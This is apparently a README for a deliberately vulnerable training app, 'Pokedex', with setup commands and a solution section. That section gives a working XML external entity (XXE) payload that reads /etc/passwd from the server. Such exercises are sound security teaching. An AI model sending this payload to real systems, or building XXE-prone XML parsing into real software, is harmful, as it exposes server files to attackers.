# Pokedex

## Description:

The application uses XML to send data to the server, which analyzes it and returns information

## Setup:

- Create and activate a python virtual environment
```bash
$ python3 -m venv venv
$ source venv bin activate
```
- Install dependencies
```bash
$ python3 -m pip install -r requirements.txt
```
- Run the application
```bash
$ python3 app.py
```

## Solution:

- The application is vulnerable to XXE attacks. The attacker can include XML entities and extract server information, like so:

```xml
<?xml version="1.0"?>
    <!DOCTYPE query [
    <!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>
    <query>
        <name>
            &xxe;
        </name>
    </query>
```